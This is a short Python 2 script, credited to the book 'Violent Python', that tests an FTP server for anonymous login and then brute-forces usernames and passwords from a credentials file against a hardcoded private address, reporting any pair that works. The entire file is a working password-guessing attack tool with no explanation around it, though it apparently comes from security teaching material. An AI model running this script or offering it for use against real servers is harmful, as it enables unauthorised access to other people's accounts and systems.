#################################################################
#
# FTP Anon/brute_force login from "Violent Python"
#
#################################################################

import ftplib
import time

def anon_chk(host):
    try:
        ftp = ftplib.FTP(host)
        ftp.login('anonymous', 'anonymous')
        print '[+] ' + str(host) + 'FTP ANonYmous LoGin SuccessFull!!'
        ftp.quit()
        return True
        
    except Exception, e:
        print '[-] ' +str(host) + ' FTP Anonymous login failed (FUCK!!!)'
        return False


def ftp_brute(host,user,pwd):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, pwd)
        print '[+] ' + str(host) + ' FTP login successfull!! ' + str(user) +':' + str(pwd)
        exit(0)
    except Exception, e:
        print '[-] ' +str(host) + ' FTP login failed (FUCK!!!)'
        return False
    
    



def main():
    host = '10.211.55.3'
    pwd_file = open('pwd_file.txt', 'r')
    print '[+] Checking for anonymous login......'
    anon_chk(host)
    print '[+] Attempting brute force login......'

    for item in pwd_file.readlines():
        time.sleep(1)
        user = item.split(':')[0]
        pwd = item.split(':')[1]
        ftp_brute(host,user,pwd)


if __name__ == '__main__':
    main()
